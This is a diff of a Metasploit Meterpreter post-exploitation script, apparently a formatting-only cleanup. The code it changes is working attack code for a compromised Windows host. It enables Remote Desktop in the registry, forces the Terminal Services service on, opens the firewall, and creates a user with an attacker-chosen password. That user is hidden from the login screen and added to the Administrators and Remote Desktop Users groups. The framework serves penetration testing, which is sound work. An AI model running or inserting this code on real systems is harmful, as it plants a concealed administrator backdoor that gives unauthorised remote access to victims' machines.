@@ -1,9 +1,9 @@
+# frozen_string_literal: true
 ##
 # WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
 # If you'd like to imporve this script, please try to port it as a post
 # module instead. Thank you.
 ##
-
 
 # Author: Carlos Perez at carlos_perez[at]darkoperator.com
 #-------------------------------------------------------------------------------
@@ -15,7 +15,7 @@ host_name = client.sys.config.sysinfo['Computer']
 filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")
 
 # Create a directory for the logs
-logs = ::File.join(Msf::Config.log_directory,'scripts', 'getgui')
+logs = ::File.join(Msf::Config.log_directory, 'scripts', 'getgui')
 
 # Create the log directory
 ::FileUtils.mkdir_p(logs)
@@ -38,76 +38,67 @@ def usage
   raise Rex::Script::Completed
 end
 
-
-
-
-def enablerd()
+def enablerd
   key = 'HKLM\\System\\CurrentControlSet\\Control\\Terminal Server'
   value = "fDenyTSConnections"
   begin
-    v = registry_getvaldata(key,value)
+    v = registry_getvaldata(key, value)
     print_status "Enabling Remote Desktop"
     if v == 1
       print_status "\tRDP is disabled; enabling it ..."
-      registry_setvaldata(key,value,0,"REG_DWORD")
-      file_local_write(@dest,"reg setval -k \'HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\' -v 'fDenyTSConnections' -d \"1\"")
+      registry_setvaldata(key, value, 0, "REG_DWORD")
+      file_local_write(@dest, "reg setval -k \'HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\' -v 'fDenyTSConnections' -d \"1\"")
     else
       print_status "\tRDP is already enabled"
     end
-  rescue::Exception => e
+  rescue ::Exception => e
     print_status("The following Error was encountered: #{e.class} #{e}")
   end
-
 end
 
-
-def enabletssrv()
+def enabletssrv
   rdp_key = "HKLM\\SYSTEM\\CurrentControlSet\\Services\\TermService"
   begin
-    v2 = registry_getvaldata(rdp_key,"Start")
+    v2 = registry_getvaldata(rdp_key, "Start")
     print_status "Setting Terminal Services service startup mode"
     if v2 != 2
       print_status "\tThe Terminal Services service is not set to auto, changing it to auto ..."
-      service_change_startup("TermService","auto")
-      file_local_write(@dest,"execute -H -f cmd.exe -a \"/c sc config termservice start= disabled\"")
+      service_change_startup("TermService", "auto")
+      file_local_write(@dest, "execute -H -f cmd.exe -a \"/c sc config termservice start= disabled\"")
       cmd_exec("sc start termservice")
-      file_local_write(@dest,"execute -H -f cmd.exe -a \"/c sc stop termservice\"")
+      file_local_write(@dest, "execute -H -f cmd.exe -a \"/c sc stop termservice\"")
 
     else
       print_status "\tTerminal Services service is already set to auto"
     end
-    #Enabling Exception on the Firewall
+    # Enabling Exception on the Firewall
     print_status "\tOpening port in local firewall if necessary"
     cmd_exec('netsh firewall set service type = remotedesktop mode = enable')
-    file_local_write(@dest,"execute -H -f cmd.exe -a \"/c 'netsh firewall set service type = remotedesktop mode = enable'\"")
-  rescue::Exception => e
+    file_local_write(@dest, "execute -H -f cmd.exe -a \"/c 'netsh firewall set service type = remotedesktop mode = enable'\"")
+  rescue ::Exception => e
     print_status("The following Error was encountered: #{e.class} #{e}")
   end
 end
 
-
-
-def addrdpusr(session, username, password)
-
+def addrdpusr(_session, username, password)
   rdu = resolve_sid("S-1-5-32-555")[:name]
   admin = resolve_sid("S-1-5-32-544")[:name]
-
 
   print_status "Setting user account for logon"
   print_status "\tAdding User: #{username} with Password: #{password}"
   begin
     addusr_out = cmd_exec("cmd.exe", "/c net user #{username} #{password} /add")
     if addusr_out =~ /success/i
-      file_local_write(@dest,"execute -H -f cmd.exe -a \"/c net user #{username} /delete\"")
+      file_local_write(@dest, "execute -H -f cmd.exe -a \"/c net user #{username} /delete\"")
       print_status "\tHiding user from Windows Login screen"
       hide_user_key = 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList'
-      registry_setvaldata(hide_user_key,username,0,"REG_DWORD")
-      file_local_write(@dest,"reg deleteval -k HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\ NT\\\\CurrentVersion\\\\Winlogon\\\\SpecialAccounts\\\\UserList -v #{username}")
+      registry_setvaldata(hide_user_key, username, 0, "REG_DWORD")
+      file_local_write(@dest, "reg deleteval -k HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\ NT\\\\CurrentVersion\\\\Winlogon\\\\SpecialAccounts\\\\UserList -v #{username}")
       print_status "\tAdding User: #{username} to local group '#{rdu}'"
-      cmd_exec("cmd.exe","/c net localgroup \"#{rdu}\" #{username} /add")
+      cmd_exec("cmd.exe", "/c net localgroup \"#{rdu}\" #{username} /add")
 
       print_status "\tAdding User: #{username} to local group '#{admin}'"
-      cmd_exec("cmd.exe","/c net localgroup #{admin}  #{username} /add")
+      cmd_exec("cmd.exe", "/c net localgroup #{admin}  #{username} /add")
       print_status "You can now login with the created user"
     else
       print_error("Account could not be created")
@@ -116,11 +107,10 @@ def addrdpusr(session, username, password)
         print_error("\t#{l.chomp}")
       end
     end
-  rescue::Exception => e
+  rescue ::Exception => e
     print_status("The following Error was encountered: #{e.class} #{e}")
   end
 end
-
 
 def message
   print_status "Windows Remote Desktop Configuration Meterpreter Script by Darkoperator"
@@ -135,7 +125,7 @@ lport = 1024 + rand(1024)
 enbl = nil
 frwrd = nil
 
-@@exec_opts.parse(args) { |opt, idx, val|
+@@exec_opts.parse(args) do |opt, _idx, val|
   case opt
   when "-u"
     usr = val
@@ -149,22 +139,21 @@ frwrd = nil
   when "-e"
     enbl = true
   end
-
-}
+end
 if client.platform =~ /win32|win64/
-  if args.length > 0
-    if enbl or (usr and pass)
+  if !args.empty?
+    if enbl || (usr && pass)
       message
       if enbl
         if is_admin?
-          enablerd()
-          enabletssrv()
+          enablerd
+          enabletssrv
         else
           print_error("Insufficient privileges, Remote Desktop Service was not modified.")
         end
       end
 
-      if usr and pass
+      if usr && pass
         if is_admin?
           addrdpusr(session, usr, pass)
         else
